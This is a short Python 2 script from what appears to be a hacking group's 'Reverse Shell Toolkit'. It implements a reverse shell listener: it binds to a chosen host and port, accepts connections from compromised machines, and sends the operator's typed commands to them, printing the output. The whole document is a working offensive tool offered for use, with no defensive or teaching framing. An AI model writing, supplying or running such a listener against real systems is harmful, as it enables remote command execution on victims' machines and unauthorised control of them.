"""
Reverse Shell Listener - Reverse Shell Toolkit - Created by MuStaP.
Offensive Defensive Information Security - ODinfoSec Team.
https://odinfosec.blogspot.com/
https://www.facebook.com/ODinfoSec/
Find More scripts & Tools on Our GitHub repository:
https://github.com/ODinfoSec/
"""
import sys
import os
import socket 
def listener():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = raw_input("Host: ")
        port = input("Port: ")
        s.bind((host,port))
        s.listen(100)
        print('''
[+] Listening on %s:%s       
''' % (host, str(port)))
        while True:
            c,a = s.accept()
            while True:
                shell = raw_input("Command:> ")
                if(shell == "exit"):
                    c.close()
                    exit()
                else:
                    c.send(shell)
                    output = c.recv(100000)
                    print(output)
    except Exception as error:
        print(error)         
    except KeyboardInterrupt:
        exit()      
listener()           
    